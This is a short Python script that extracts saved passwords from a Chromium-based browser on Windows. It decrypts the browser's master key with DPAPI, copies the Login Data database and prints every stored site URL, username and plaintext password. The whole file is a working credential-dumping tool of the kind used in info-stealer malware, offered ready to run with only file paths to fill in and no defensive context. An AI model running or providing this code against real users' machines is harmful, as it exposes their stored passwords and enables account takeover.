# Put your path to local state file and login data file below in provided variables.

import base64
import json
import os
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil

def get_encryption_key(local_state_path):

    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state_data = json.load(f)
    

    encrypted_key = local_state_data['os_crypt']['encrypted_key'] 

    decoded_key = base64.b64decode(encrypted_key)
    
    decoded_key = decoded_key[5:]
    
    decrypted_key = win32crypt.CryptUnprotectData(decoded_key, None, None, None, 0)[1]
    
    return decrypted_key

def decrypt_password(ciphertext, key):
    try:
        iv = ciphertext[3:15]
        payload = ciphertext[15:]
        
        cipher = AES.new(key, AES.MODE_GCM, iv)
        
        decrypted_pass = cipher.decrypt(payload)[:-16].decode() 
        return decrypted_pass
    except Exception as e:
        print(f"An error occurred: {e}")
        return ""

def fetch_saved_passwords(local_state_path, login_data_path):
    key = get_encryption_key(local_state_path)
    
    shutil.copyfile(login_data_path, "Login Data Copy")
    conn = sqlite3.connect("Login Data Copy")
    cursor = conn.cursor()
    
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    for row in cursor.fetchall():
        origin_url = row[0]
        username = row[1]
        encrypted_password = row[2]
        
        decrypted_password = decrypt_password(encrypted_password, key)
        
        print(f"Origin URL: {origin_url}")
        print(f"Username: {username}")
        print(f"Password: {decrypted_password}")
        print("-" * 50)
    
    cursor.close()
    conn.close()
    os.remove("Login Data Copy")

if __name__ == "__main__":
    
    local_state_path = r'path\to\localstate\file' #here
    login_data_path = r'path\to\login\data\file' #here
    
    fetch_saved_passwords(local_state_path, login_data_path)
